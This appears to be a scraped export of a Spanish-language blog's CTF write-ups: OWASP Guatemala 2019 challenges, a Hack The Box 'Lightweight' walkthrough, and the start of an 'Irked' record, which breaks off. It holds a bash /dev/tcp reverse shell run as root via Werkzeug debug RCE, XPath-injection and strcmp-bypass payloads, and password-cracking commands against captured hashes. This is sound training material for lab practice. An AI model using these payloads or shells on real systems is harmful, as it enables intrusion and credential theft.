archivo flag user y un hint:\nuser.txt: flag{598852e2cd167e254ce4c5e95393c372}\n1 2 3 4 5  cat hint.txt Si estas leyendo esto felicidades, vas muy bien... Para la elevacion de privilegios en esta maquina tiene que realizar port forwarding... debug to rce werkzeug ....   Revisamos los puertos con netstat -ntpl\n1 2 3 4 5 6 7 8 9 10  (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:5000 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:5355 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:10000 0.0.0.0:* LISTEN 3740/socat tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::5355 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN -   Como lo dice el hint vamos a hacer port fordwarding del puerto 5000, lo vamos a traer a nuestra maquina local por medio de SSH.\n1  ssh -L 5656:127.0.0.1:5000 retoinfra2@192.168.1.21   Revisamos localmente con netstat -tnpl y tenemos localmente el puerto 5000 en el puerto 5656 :).\n1 2 3 4 5 6 7  root@sckull:~/owasp/infra# netstat -ntpl Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN 1/init tcp 0 0 127.0.0.1:5656 0.0.0.0:* LISTEN 4456/ssh tcp6 0 0 :::111 :::* LISTEN 1/init tcp6 0 0 ::1:5656 :::* LISTEN 4456/ssh   Como lo decia el hint, debug to rce werkzeug, encontramos un script que nos ayuda a ejecutar comandos en la maquina cuando esta activado \u0026ldquo;debug=True\u0026rdquo;.\nhttps://github.com/its-arun/Werkzeug-Debug-RCE\nEjecutamos el script y le pasamos la ip local con el puerto que trajimos con SSH tambien le pasamos un comando y eventualmente obtenemos la bandera root.txt\nintra2_root.webp\nroot.txt: flag{8eab1e913f4a669eddbbd45c1484925a}\nSHELL ROOT Agregamos una shell inversa a un archivo sh en la carpeta del usuario que tenemos con bajos privilegios, para ejecutarlo como usuario root.\n1 2 3  retoinfra2@ubuntu:~$ echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.10/7878 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; shell.sh retoinfra2@ubuntu:~$ pwd /home/retoinfra2   Y por medio del script ejecutamos el archivo que contiene nuestra shell inversa y obtenemos una shell como root.\nroot.txt: flag{8eab1e913f4a669eddbbd45c1484925a}\nuser.txt: flag{598852e2cd167e254ce4c5e95393c372}\n","description":"OWASP CTF es una maquina del OWASP Guatemala, aqui encontrarás la solucion para obtener la flag user.txt y root.txt de las diferentes maquinas Windows y Linux presentadas por los organizadores.","id":149,"section":"posts","tags":[],"title":"OWASP CTF 2019 Guatemala - Infraestructura","uri":"https://sckull.github.io/posts/owaspinfra/"},{"content":"  OWASP CTF es una serie de retos del OWASP Guatemala, aqui encontrarás la solucion para obtener las flags de los diferentes retos presentados por los organizadores.\nSCOREBOARD TRIVIA Dark Army whiterose\nFriends angela_moss\nE-corp flag{fsociety00.dat}\nFsociety mr robot\nCRYPTO BASE Decodificamos el mensaje en base32.\nComando:\n1  echo MZWGCZ33MJQXGZJTGJPWS427OZSXE6K7MJXXEZLEEF6Q====|base32 -d   flag{base32_is_very_bored!}\nPI PI PI Utilizando google buscamos una de las strings (\u0026ldquo;di-dah-dah\u0026rdquo;) y encontramos que es codigo morse utilizando di y dah que representan los sonidos. Codigo morse.\n1  dah-dah-dah di-dah-dah di-dah di-di-dit di-dah-dah-dit dah-dah-dah-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-di-dit dah-dah-dah-dah-dit   Escribí un pequeño script en python utilizando la tabla de valores descritos en la pagina(Codigo morse).\n Morse_leng.py - GitHub  flag: OWASP0123456789\nBRAIN Brainfuck es un lenguaje que se representa por medio de los caracteres \u0026gt;\u0026lt;+-.,[] para obtener la flag se utilizo un decoder online. https://www.dcode.fr/brainfuck-language\n1  ++++++++++[\u0026gt;+\u0026gt;+++\u0026gt;+++++++\u0026gt;++++++++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;-]\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.++++++.-----------.++++++.++++++++++++++++++++.-------------------------.++++++++++++++++.-----------------.\u0026lt;\u0026lt;+++++++++++++++++++.\u0026gt;\u0026gt;+++++++++++++.--------.+++++++++++++++.------------------.++++++++.------------.++++++++++++++++++++++++.----------------------.++++++++++++++++++.--------------------.+++++++++.\u0026lt;\u0026lt;++.\u0026gt;\u0026gt;++++++++++.\u0026lt;\u0026lt;.\u0026gt;\u0026gt;+++++++++++.   flag{bra1nfuck_was_h3r3} \nHTP Nos dan lo que parece una contraseña para poder obtener que tipo de hash es utilizamos hashcat, de igual forma para desencriptar la contraseña la misma herramienta.\n1  Grecie:$apr1$9zQh77LH$cbQwfDnON90qz0mhYg1Yv.    Hashcat - 1600  Decrypted:\n1  $apr1$9zQh77LH$cbQwfDnON90qz0mhYg1Yv.:classof08   flag{classof08}\nTURIN En este reto nos dan un string y una imagen, con el titulo se puede concluir que pertenece a la maquina de turing y la imagen pertenece a la configuracion que debe de tener la maquina para poder obtener el mensaje oculto en el string. Utilizamos la pagina de cryptii.com para obtener nuestra flag.\n1  text:ixqajtrjaq   flag{heilhitler}\nIMPA Para este reto nos dan una pista, al investigar acerca del personaje nos encontramos en la wiki de zelda el lenguaje Sheikah, utilizamos imagenes de google para poder obtener nuestra bandera tambien existe un traductor en dcode.fr/sheikah-language\n Wiki de Zelda  Reto:\nImpa:\nflag{ZELDALOVEU}\nBATMAN Utilizamos motherreff.in para decodificar la flag.\n1  AABABABABAAAAAAAABBA{AAAABAAAAABAABAABABBAAAAAABBAAAAABAAABBBABAAAABBBAAABAABAAAAABAAABAAABAABAAAAAAABAAABBABBA}   FLAG{BATMANCHIPERISEASY}\nKING Un poco de informacion de este reto, la NSA mostro un mensaje parecido a este en un twitt, segun un post es un tipo de rompecabezas que vienen en los periodicos. Existen difrentes paginas que pueden decodificar mensajes de este tipo.\n cryptogram oneacross quipqiup  Para resolver este reto utilizamos una pagina de las listadas anteriormente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  izu gjweft yifgx izji tjluy wf yuwyu yijgiy frr vkiz jw kdu dgujt igadl j dzur jwe j hkudu fr hpaif. izu maxy izji fvwue izu kdu dgujt igadl yifpu izu hkudu fr hpaif rgft izu hjyigx dzur vzf fnijkwue ki rgft izu rpxkwm upuhzjwi. izu rpxkwm upuhzjwi mfi ki rgft j yatf vguyipug vzf fnijkwue ki kw izu yatf dzjthkfwyzkh fw yjiagw. izux vuwi if yjiagw nudjayu qahkiug vjy rapp fr taijwi nujsdffwy. izu nujsdffwy vugu rgft tjgy vzugu izu nannpx nannpuy, jw jwdkuwi rjwm izji vjy nagkue kw djtupfi pksue. izu nannpx nannpuy djtu njdl jiug izu dpfvwy guyaggudiue zkt kw jw jwdkuwi nagkjp yhupp fr tjmkdjpwuyy. izuw izu dfgwefm rgft suway puje jw jiijdl fr djwfuy fwif izu gayykjwy vzf guyhfweue nx ijlkwm tdefwjpey jvjx rgft dzkwj. ykwdu dzkwj ekew\u0026#39;i zjsu jwxtfgu tdefwjpey izux eudkeue if nax j hkccj zai. izu hkccj zai vjy izuw yifpuw nx j ijplkwm upuhzjwi rgft kwekj. izu upuhzjwi vjy izu maga\u0026#39;y jwe zu pksue ji izu jyzgjt kw pfy jwmupuy. izu upuhzjwi zje j hkm rgkuwe vzf ijamzi tjiz. izu hkm ubhpfeue fwu ejx jwe puri izu vzfpu vfgpe vfweugkwm. ykwdu izu hkm ubhpfeue izu lkwm hkm npjtue izu mkjwiy. ykwdu izu mkjwiy zjiue nukwm npjtue izux pue jw jiijdl fw izu lkwm jwe ykwdu izux vugu fr dfagyu tadz nkmmug izux vugu skdifgkfay. jriug izu mkjwiy iffl dfwigfp fr mguuwpjwe izux yijgiue rkmzikwm izu sklkwmy rgft kdupjwe. izu fhhfwuwiy vugu uouwpx tjidzue yf izux uweue ah euyigfxkwm ujdz fizug jwe izux nudjtu ubikwdi. izuw izu mfgkppjy yifpu izu zfwej igjkp 70\u0026#39;y rgft ifwx yfhgjwf izu puje mjwmyiug rgft kijpx. ifwx yfhgjwf jdiajppx mfi izu zfwej\u0026#39;y rgft kwekj jwxzfv njdl if izu mfgkppjy. izu mfgkppjy yijgiue djaykwm j galay kw izu nkm jhhpu, jdiajppx j nkm jhhpu, vzugu izux gjw fsug nkppx qfu jwe ukpuuw. ykwdu izu rffinjpp hpjxugy vugu dzjykwm izut izu mfgkppjy zfhhue kwif izu mkjwi hujdz vkiz qjtuy vzf vjy uydjhkwm zky uskp hjguwiy. izu yifgx uwey izugu k\u0026#39;t yfggx if yjx nai fz vupp zux, zux, zux. izu rpjm ky \u0026#34;izux jpp pksue zjhhkpx uoug jriug\u0026#34;.   1  the random story that makes no sense starts off with an ice cream truck a chef and a piece of pluto the guys that owned the ice cream truck stole the piece of pluto from the pastry chef who obtained it from the flying elephant the flying elephant got it from a sumo wrestler who obtained it in the sumo championship on saturn they went to saturn because jupiter was full of mutant beavcoons the beavcoons were from mars where the bubbly bubbles an ancient fang that was buried in camelot lived the bubbly bubbles came back ater the clowns resurrected him in an ancient burial spell of magicalness then the corndog from venus lead an attack of canoes onto the russians who responded by taking mcdonalds away from china since china didn t have anymore mcdonalds they decided to buy a pizza hut the pizza hut was then stolen by a talking elephant from india the elephant was the guru s and he lived at the ashram in los angeles the elephant had a pig friend who taught math the pig exploded one day and left the whole world wondering since the pig exploded the king pig blamed the giants since the giants hated being blamed they led an attack on the king and since they were of course much bigger they were victorious after the giants took control of greenland they started fighting the vikings from iceland the opponents were eqenly matched so they ended up destroying each other and they became extinct then the gorillas stole the honda trail s from tony soprano the lead gangster from italy tony soprano actually got the honda s from india anyhow back to the gorillas the gorillas started causing a rukus in the big apple actually a big apple where they ran over billy joe and eileen since the football players were chasing them the gorillas hopped into the giant peach with james who was escaping his evil parents the story ends there i m sorry to say but oh well hey hey hey the flag is they all lived happily eqer after   Se cambio la q por una v.\nthey all lived happily eqer after\nflag: they all lived happily ever after\nSAVE ME! Archivos .fun, Investigamos sobre la extension de estos archivos y encontramos que es un virus de tipo ransomware, el cual encripta los archivos con esa extension.\n Fun ransomware  Para obtener los archivos encriptados en el archivo del reto utilizamos jigsaw.exe el cual nos permite desencriptar este tipo de archivos.\nflag{Jigsaw_ransomware_in_house}\nESTEGANOGRAFIA DATA Utilizamos exif para ver los metadatos de la imagen y encontramos la flag.\nflag{metadata_in_the_dark}\nMATRIX Utilizamos inlite para decodificar la imagen One Line BarCode Reader\nflag{matr1x_qr}\nMONDRIAN Una imagen que tiene un mensaje oculto, este lenguaje se llama piet y se encuentra en imagenes que parecen estilo abstractas. Piet\nDecodificamos la imagen aqui:\n Npiet Execute  flag{p1et_programm1ng!}\nHIDE Utilizamos binwalk para extraer lo que esta en el interior de la imagen, al extraer el archivo descomprimimos de nuevo y obtenemos un archivo txt, este nos indica que esta en diferentes bases, decodificamos el mensaje en base64 y base32 para obtener la flag.\ntryhackme{b1nw4lk_0r_f0r3mo5t}\nREVERSING CRACKME1 Para hacer una compilacion inversa al archivo crackme.pyc existe una herramienta llamada uncompyle2 para obtener el codigo fuente equivalente al archivo.\nComando:\n1  uncompyle2 crackme.pyc -o crackme.py   Codigo fuente (Ordenado manualmente para obtener la flag):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  import random lr = \u0026#39;2\u0026#39; db = \u0026#39;w\u0026#39; ef = \u0026#39;s\u0026#39; ty = \u0026#39;3\u0026#39; gh = \u0026#39;!\u0026#39; aa = \u0026#39;O\u0026#39; rr = \u0026#39;p\u0026#39; nn = \u0026#39;a\u0026#39; chains = [116,104,105,115,32,105,115,32,97,32,116,114,111,108,108] chars = [] lock_pick = random.randint(0, 1000) lock = lock_pick * 2 password = [105,116,115,32,110,111,116,32,116,104,97,116,32,101,97,115,121] lock = lock + 10 lock = lock / 2 auth = [107,101,101,112,32,116,114,121,105,110,103] lock = lock - lock_pick print lock slither = aa + db + nn + ef + rr + gh + lr + ty print slither keys = [112,97,115,115,119,111,114,100,33,33] print \u0026#39;Authentication required\u0026#39; print \u0026#39;\u0026#39; user_input = raw_input(\u0026#39;Enter your username\\n\u0026#39;) if user_input == slither: print \u0026#39;yeeeea! correct user!\u0026#39; else: print \u0026#39;Wrong username try harder\u0026#39; exit()   flag: Owasp!23\nCRACKME2 Utilizamos rabin2 para obtener las strings dentro del archivo bin y obtuvimos el usuario correcto.\nflag: hax0r\nMISC SHADOW Un archivo que contiene la contraseña del usuario root, usamos john the ripper para obtener la ocnttraseña.\nflag{toor} \nREGISTER La bandera de este reto pertenece al reto de registrarse en la plataforma. http://ctf.develsecurity.com/0x1 En hora buena por tu registro , tu premio es la flag para el reto register en la categoria misc.\nflag{00010!}\nPDF Utilizamos pdfcrack y el diccionario Ashley Madison. Diccionario: AshleyMadisonCracked\nComando:\n1  pdfcrack -f flag-protected.pdf -w AshleyMadisonCracked.txt   Contraseña: zerkalo1974\nflag{pdfcrack_was_here!}\nKEEP Utilizamos keepass2john para obtener el hash y hashcat para obtener la contraseña del archivo.\n1  $keepass$*2*60000*0*cc74b5166afe1df0757d8d208078d4d2f9fe3e331ff730b9cb5cfb94064eea50*b6d616ca2c797d4a942df786640acc92749f8005fc2b31114c0ba5b2aced9a5e*459b7fe3b1200a8b48ad9663925465c4*72cdc691f0f93f79476c83f8b1f1db44ab23ca6217048cd67bbde5e8ff76b402*1acb7f5538987791204995bc3c1ba96a254b3be85051946058b07ee6ef1b4d45   Comando hashcat:\n1  hashcat64.bin -m 13400 keepas.txt ../rockyou.txt -o keepas_owasp.txt   Contraseña: zaq1zaq1\nUtilizamos keepassx para abrir el archivo Database.kdbx.\nVemos un mensaje de flag pero no aparece nuestra flag como cadena normal, el texto que aparece en el campo de password parece ser base64 invertida, invertimos el mensaje y decodificamos.\nComando:\n1  echo =0HZy92dzNXYw9VZyV3YlNnbx8Fa0FzdfNXYwVWZr91ZuFzahVmcit3ZhxmZ |rev|base64 -d   flag{break1ng_keepas_w1th_1nsecure_password}\nZERO Para este reto escribí un script en python y con el codigo ascii que aparece en el archivo leeme.txt generamos un codigo de barras para luego obtener la bandera en https://online-barcode-reader.inliteresearch.com/.\n stego_zero.py - GitHub  flag{qr_to_ascii_art}\nPORT Para este reto hicimos un escaneo de puertos con nmap a la plataforma del ctf, encontramos el puerto 1337 al visitarlo nos muestra un error con nuestra flag.\nComando:\n1  nmap -p1-65535 ctf.develsecurity.com   1 2 3 4 5 6 7 8 9 10  PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)25/tcp filtered smtp80/tcp open http81/tcp open http Apache httpd 2.4.18 ((Ubuntu))82/tcp open http Apache httpd 2.4.18 ((Ubuntu))83/tcp open http Apache httpd 2.4.18 ((Ubuntu))84/tcp open http Apache httpd 2.4.18 ((Ubuntu))111/tcp open rpcbind 2-4 (RPC #100000)1337/tcp open waste?  Mensaje al visitar la pagina.\n1 2 3 4 5 6 7 8 9  xmp\u0026amp;gt;perl: warning: Setting locale failed.perl: warning: Please check that your locale settings: LANGUAGE = (unset), LC_ALL = (unset), LANG = \u0026#34;es_GT.UTF-8\u0026#34; are supported and installed on your system.perl: warning: Falling back to the standard locale (\u0026#34;C\u0026#34;).Unescaped left brace in regex is deprecated, passed through in regex; marked by \u0026lt;!-- HERE in m/%{ --\u0026gt; HERE (.*?)}/ at /usr/bin/print line 528.Error: no such file \u0026#34;flag{secret_in_the_port_is_null}\u0026#34;  flag{secret_in_the_port_is_null}\nMOBILE MOBILE Utilizamos apktool para poder decompilar el archivo Mobile1.apk y ver el codigo que tiene dentro. Tambien podemos utilizar Java Decompilers para el mismo fin.\nLa flag se encuentra en HelloWorldActivity.\nCodigo generado por javadecompilers.\n1 2 3 4 5 6 7 8 9 10 11  package com.example.helloworld; import android.os.Bundle; import com.phonegap.DroidGap; public class HelloWorldActivity extends DroidGap { public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); super.loadUrl(\u0026#34;flag{de0fuscate_code}\u0026#34;); } }   flag{de0fuscate_code}\nWEB HIDE Para este reto buscamos directorios comunes, tambien buscamos en el codigo fuente de las paginas. http://ctf.develsecurity.com:81/admin/flag.txt\nflag{http_directory_indexing}\nDEFAULT De igual forma, algunos directorios comunes. http://ctf.develsecurity.com:82/install/\nflag{default_files_installation_fake_cms}\nINJECT XPATH INJECTION Probamos con alguno de los payloads aqui descritos y obtuvimos la flag.\nPayloads: XPATH Injection - PayloadsAllTheThings\nPayload: x' or 1=1 or 'x'='y\nflag{XPATH_1NJ3CT10N}\nBYPASS Utilizamos el siguiente payload en metodo POST para obtener la bandera.\nPayload: ?password[]=\u0026quot;\u0026quot;\nhttp://ctf.develsecurity.com:84/login.php?password[]=%22%22\nflag{bypass_strcmp_function}\nFORENSICS Para este reto revisamos todas las conexiones que se hicieron durante el volcado de memoria de este archivo, no enocontramos alguna ip que se ejecutara bajo un proceso en especifico. Asumiendo que al realizar este volcado de memoria se identifico a algun tipo de intruso en la computadora revisamos el \u0026ldquo;historial\u0026rdquo; de comandos y encontramos que antes de realizar el volcado de memoria el usuario hizo ping a una direccion que no aparece por ningun lado (sockets,socketscan,connscan,etc).\nflag: 192.168.21.161\nNSA.ZIP[raw] Para este reto utilizamos volatility y algunos de sus comandos para obtener las flags.\nProfile: Win7SP1x64\nHASH NTLM flag:31d6cfe0d16ae931b73c59d7e0c089c0\nUSER flag: victim\nPID Pid del proceso wmpnetwk.exe.\nflag: 2464\nSIDs flag: S-1-5-21-3480093824-3207195214-1800084707-1001\nCOMPUTER NAME flag:VICTIM-PC\nOSINT IP NSA Utilizamos algunas paginas para obtener informacion del historial de IPs de nsa.gov.\nhttps://myip.ms/\nNuestra flag: flag{23.196.119.211}\n1  23.196.119.211 United States Akamai Technologies, Inc. 2016-08-25  SEXY Utilizamos Google Images para hacer una busqueda de la imagen e informacion.\nflag: tiffanytrump\nSTUX flag: 1096100\nNetworking NETWORKING1 Utilizamos Wireshark y un filtro para el puerto 21 FTP.\n tcp.port==21 ftp  flag{sn1ff1ng_ftp_cr3dent1als}\nNETWORKING2  http.request.method == \u0026ldquo;POST\u0026rdquo;  flag{http_1nsecure_commun1cat1on}\n","description":"OWASP CTF es una serie de retos del OWASP Guatemala, aqui encontrarás la solucion para obtener las flags de los diferentes retos presentados por los organizadores.","id":150,"section":"posts","tags":[""],"title":"OWASP CTF 2019 Guatemala - Writeup","uri":"https://sckull.github.io/posts/owasp2019/"},{"content":"  Nos topamos con un registro de IPs que nos dio acceso por SSH, con tcpdump obtuvimos credenciales que usamos en SSH. Cambiamos al siguiente usuario tras crackear la contraseña encontrada en una conexion de LDAP. Realizamos la lectura de la flag root utilizando openssl.\nInformacion de la Maquina    Nombre Lightweight      OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.119   Maker 0xEA31    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7.3, 6.1, 4.5, 5.5, 3.9], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP En el resultado del escaneo de puertos tcp con nmap nos muestra tres puertos abiertos ssh, http y ldap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  Nmap 7.70 scan initiated Thu Jan 10 15:20:40 2019 as: nmap -sC -sV -o tcp 10.10.10.119 Nmap scan report for 10.10.10.119 Host is up (0.20s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA) | 256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA) |_ 256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16) 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X | ssl-cert: Subject: commonName=lightweight.htb | Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain | Not valid before: 2018-06-09T13:32:51 |_Not valid after: 2019-06-09T13:32:51 |_ssl-date: TLS randomness does not represent time Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done at Thu Jan 10 15:21:22 2019 -- 1 IP address (1 host up) scanned in 41.92 seconds   NMAP SCRIPT: LDAPSEARCH Utilizamos el script de nmap ldapsearch para poder obtener informacion en el puerto de ldap abierto, obtenemos informacion relacionada con usuarios, correo electronico, contraseña, etc.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79  Nmap 7.70 scan initiated Thu Jan 10 15:40:00 2019 as: nmap -sC -sV -p389 --script=ldap-search -o ldap-nmap 10.10.10.119 Nmap scan report for 10.10.10.119 Host is up (0.18s latency). PORT STATE SERVICE VERSION 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X | ldap-search: | Context: dc=lightweight,dc=htb | dn: dc=lightweight,dc=htb | objectClass: top | objectClass: dcObject | objectClass: organization | o: lightweight htb | dc: lightweight | dn: cn=Manager,dc=lightweight,dc=htb | objectClass: organizationalRole | cn: Manager | description: Directory Manager | dn: ou=People,dc=lightweight,dc=htb | objectClass: organizationalUnit | ou: People | dn: ou=Group,dc=lightweight,dc=htb | objectClass: organizationalUnit | ou: Group | dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb | uid: ldapuser1 | cn: ldapuser1 | sn: ldapuser1 | mail: ldapuser1@lightweight.htb | objectClass: person | objectClass: organizationalPerson | objectClass: inetOrgPerson | objectClass: posixAccount | objectClass: top | objectClass: shadowAccount | userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/ | shadowLastChange: 17691 | shadowMin: 0 | shadowMax: 99999 | shadowWarning: 7 | loginShell: /bin/bash | uidNumber: 1000 | gidNumber: 1000 | homeDirectory: /home/ldapuser1 | dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb | uid: ldapuser2 | cn: ldapuser2 | sn: ldapuser2 | mail: ldapuser2@lightweight.htb | objectClass: person | objectClass: organizationalPerson | objectClass: inetOrgPerson | objectClass: posixAccount | objectClass: top | objectClass: shadowAccount | userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1 | shadowLastChange: 17691 | shadowMin: 0 | shadowMax: 99999 | shadowWarning: 7 | loginShell: /bin/bash | uidNumber: 1001 | gidNumber: 1001 | homeDirectory: /home/ldapuser2 | dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb | objectClass: posixGroup | objectClass: top | cn: ldapuser1 | userPassword: {crypt}x | gidNumber: 1000 | dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb | objectClass: posixGroup | objectClass: top | cn: ldapuser2 | userPassword: {crypt}x |_ gidNumber: 1001 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done at Thu Jan 10 15:40:14 2019 -- 1 IP address (1 host up) scanned in 14.17 seconds   HASHCAT Ya que encontramos contraseñas encriptadas podriamos utilizar hashcat para realizar un ataque a contraseña pero este metodo podria tardar mucho tiempo tomando en cuenta el tamaño de nuestro diccionario, por lo que vamos a seguir buscando por otros lados acceso.\n1  hashcat -m 1800 -o pass.txt ldap-password.txt /usr/share/wordlist/rockyou.txt --force ldap-password.txt   1 2  $6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/ $6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1   HTTP Ya que esta maquina tiene el puerto http abierto procedemos a visitar la pagina, y nos muestra un mensaje This site is protected by agains bruteforging..\nAl visitar las paginas disponibles encontramos\nAl visitar la pagina de user nos muestra un mensaje This server lets you get in with ssh. Your IP (10.10.12.63) is automatically added as userid and password within a minute of your first http page request... , la pagina nos genera un usuario (IP) y contraseña (IP) con los cuales podemos ingresar a la maquina por el puerto 22 de ssh.\nLIMITED SSH Utilizamos las credenciales que nos proporciona la pagina y obtenemos una shell atravez de ssh con privilegios de bajo nivel.\nYa que no encontramos software con privilegios (SUID, GUID) que nos pueda ayudar a escalar privilegios procedemos a buscar software con ciertas capacidades (getcap/setcap).\nEncontramos tcpdump que es utilizado para analizar el trafico de una red, y tiene CAP_NET_ADMIN y CAP_NET_RAW, para realizar operaciones relacionadas a la red.\nLDAPUSER2 TCPDUMP Utilizamos tcpdump para ver que cosas interesantes nos podemos capturar.\nAl realizar un analisis al archivo encontramos algo interesante, puesto que la maquina es un servidor http y ldap al mismo tiempo de alguna forma al realizar el listado de IPs baneadas el servidor hace una verificacion mediante ldap para poder actualizar dicha pagina y en los paquetes capturados encontramos al usuario ldapuser2 y su contraseña.\nUtilizamos las credenciales encontradas y obtenemos una shell como ldapuser2 y el user.txt flag.\nLDAPUSER1 En nuestra carpeta como usuario ldapuser2 encontramos un archivo backup.7z al intentar descomprimirlo nos pide una contraseña. Utilizamos fuerza bruta para poder encontrar y descomprimir el contenido del archivo, para ello 7z2hashcat.pl nos fue de gran ayuda.\nAl descomprimir el contenido de backup.7z encontramos lo siguiente.\nAnalizamos cada uno de los archivos encontramos al usuario ldapuser1 y su contraseña en status.php.\nUtilizamos las credenciales.\nROOT FLAG - OPENSSL Al realizar una busqueda de algun software para escalar privilegios encontramos que openssl tiene las capacidades habilitadas y permitidas.\nUtilizamos openssl para hacer bypass (openssl), leer y escribir archivos. En este caso vamos a utilizar openssl para leer el root.txt flag que se encuentra en /root/root.txt.\n","description":"Nos topamos con un registro de IPs que nos dio acceso por SSH, con tcpdump obtuvimos credenciales que usamos en SSH. Cambiamos al siguiente usuario tras crackear la contraseña encontrada en una conexion de LDAP. Realizamos la lectura de la flag root utilizando openssl.","id":151,"section":"posts","tags":["capabilities","tcpdump","openssl"],"title":"Hack The Box - Lightweight","uri":"https://sckull.github.io/posts/lightweight/"},{"content":"  Irked tiene expuesto el puerto de UnrealIRCd el cual tiene un backdoor, lo que nos dio acceso a la maquina. El siguiente usuario lo obtuvimos por medio de un reto de Esteganografia. Escalamos privilegios mediante un fichero el cual ejecutaba un script donde agregamos una shell inversa.\n   Nombre Irked      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.117   Maker MrAgent    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.7, 4.7, 6.6, 3.4, 5.3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[7, 5, 8, 2, 5], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 